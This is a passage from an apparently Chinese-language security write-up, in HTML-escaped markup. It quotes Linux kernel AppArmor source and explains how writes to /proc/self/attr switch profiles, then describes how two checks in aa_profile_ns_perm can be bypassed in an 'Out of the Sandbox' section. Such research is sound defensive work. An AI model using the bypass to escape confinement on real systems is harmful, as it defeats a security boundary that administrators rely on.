&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;apparmor_setprocattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lsm_name_to_attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [8]&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;do_setattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [9]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EINVAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;lsm_name_to_attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;current&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LSM_ATTR_CURRENT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;exec&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LSM_ATTR_EXEC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;do_setattr()&lt;/code&gt; 函式會先是解析寫入的輸入資料，其格式為：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;&amp;lt;操作&amp;gt; &amp;lt;設定檔名稱&amp;gt;&quot;&lt;/code&gt;。接著，它會根據被寫入的檔案與操作種類，來決定呼叫 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_change_profile()&lt;/code&gt; 時所使用的參數，以執行對應的設定檔切換或操作。&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;do_setattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LSM_ATTR_CURRENT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;changeprofile&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_change_profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AA_CHANGE_NOFLAGS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;permprofile&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_change_profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AA_CHANGE_TEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;stack&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_change_profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AA_CHANGE_STACK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LSM_ATTR_EXEC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;exec&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_change_profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AA_CHANGE_ONEXEC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;stack&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_change_profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AA_CHANGE_ONEXEC&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
                             &lt;span class=&quot;n&quot;&gt;AA_CHANGE_STACK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_change_profile()&lt;/code&gt; 會根據不同的 flag 來決定如何套用指定的設定檔。首先，它會根據使用者輸入的設定檔名稱，找出對應的設定檔物件 [10]，然後根據 flag 的內容執行不同的更新邏輯。若包含 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AA_CHANGE_STACK&lt;/code&gt; flag，AppArmor 會將新的設定疊加在現有設定檔之上。若是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AA_CHANGE_TEST&lt;/code&gt; flag，則代表這次操作僅用於測試，並不會真正套用設定檔。&lt;/p&gt;

&lt;p&gt;如果既沒有設定 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AA_CHANGE_STACK&lt;/code&gt;，也沒有設定 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AA_CHANGE_TEST&lt;/code&gt;，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_change_profile()&lt;/code&gt; 會使用剛剛取得的設定檔建立一個新的 AppArmor 標籤（label）物件 [11]，然後透過 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_replace_current_label()&lt;/code&gt; [12] 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_set_current_onexec()&lt;/code&gt; [13] 將這個新標籤套用到目前的程式上。&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;aa_change_profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fqname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_label&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_label_parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fqname&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* profile name */&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GFP_KERNEL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [10]&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fn_label_build_in_ns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GFP_KERNEL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [11]&lt;/span&gt;
                       &lt;span class=&quot;n&quot;&gt;aa_get_label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
                       &lt;span class=&quot;n&quot;&gt;aa_get_label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AA_CHANGE_ONEXEC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_replace_current_label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [12]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;aa_put_label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;aa_set_current_onexec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [13]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;簡而言之，若寫入的目標是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/self/attr/exec&lt;/code&gt;，且內容為 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;exec &amp;lt;設定檔名稱&amp;gt;&quot;&lt;/code&gt;，那麼新的 AppArmor 設定檔會在程式執行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_execve&lt;/code&gt; 系統呼叫後被套用。&lt;/p&gt;

&lt;p&gt;相反地，若是寫入 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/self/attr/current&lt;/code&gt; 並使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;changeprofile &amp;lt;設定檔名稱&amp;gt;&quot;&lt;/code&gt;，則該程式的設定檔會立即被更新。&lt;/p&gt;

&lt;h2 id=&quot;4-out-of-the-sandbox&quot;&gt;4. Out of the Sandbox&lt;/h2&gt;

&lt;p&gt;現在讓我們回過頭來看 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_profile_ns_perm()&lt;/code&gt; 中的檢查邏輯。&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_label&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;aa_profile_ns_perm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_profile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* ... */&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile_unconfined&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [1]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;profiles_ns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unconfined&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [2]&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;第一個檢查是判斷目前的設定檔是否處於 unconfined 狀態 [1]。這個條件可以透過套用一個強制模式（Enforced mode）或回報模式（Complain mode）的設定檔來繞過。&lt;/p&gt;

&lt;p&gt;第二個檢查則是確認目前的設定檔是否就是系統預設的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unconfined&lt;/code&gt; 設定檔 [2]。因此，只要改用一個非預設的設定檔，這個檢查同樣也可以被繞過。&lt;/p&gt;

